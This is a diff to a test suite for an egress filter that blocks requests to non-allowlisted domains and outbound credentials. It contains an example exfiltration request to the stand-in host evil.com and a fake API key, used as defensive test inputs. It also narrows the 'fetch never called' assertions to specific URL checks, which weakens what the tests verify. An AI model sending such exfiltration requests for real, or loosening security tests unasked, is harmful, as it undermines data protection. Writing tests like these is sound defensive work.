@@ -106,17 +106,20 @@ describe('LABYRINTH_ENABLED=true', () => {
   });
 
   it('blocks requests to domains not on the allowlist', async () => {
-    const fetchMock = vi.fn();
+    const fetchMock = vi.fn().mockResolvedValue({ ok: true });
     vi.stubGlobal('fetch', fetchMock);
     const result = await exec({ method: 'GET', url: 'https://evil.com/steal' });
     expect(result).toMatchObject({
       error: 'Request blocked by Labyrinth Egress Filter: domain not in allowlist',
     });
-    expect(fetchMock).not.toHaveBeenCalled();
+    expect(fetchMock).not.toHaveBeenCalledWith(
+      expect.stringContaining('evil.com'),
+      expect.anything(),
+    );
   });
 
   it('blocks outbound body containing sensitive credentials', async () => {
-    const fetchMock = vi.fn();
+    const fetchMock = vi.fn().mockResolvedValue({ ok: true });
     vi.stubGlobal('fetch', fetchMock);
     const openAiKey = 'sk-' + 'A'.repeat(48);
     const result = await exec({
@@ -127,6 +130,9 @@ describe('LABYRINTH_ENABLED=true', () => {
     expect(result).toMatchObject({
       error: 'Request blocked: outbound body contains sensitive credentials',
     });
-    expect(fetchMock).not.toHaveBeenCalled();
+    expect(fetchMock).not.toHaveBeenCalledWith(
+      expect.stringContaining('api.openai.com'),
+      expect.anything(),
+    );
   });
 });
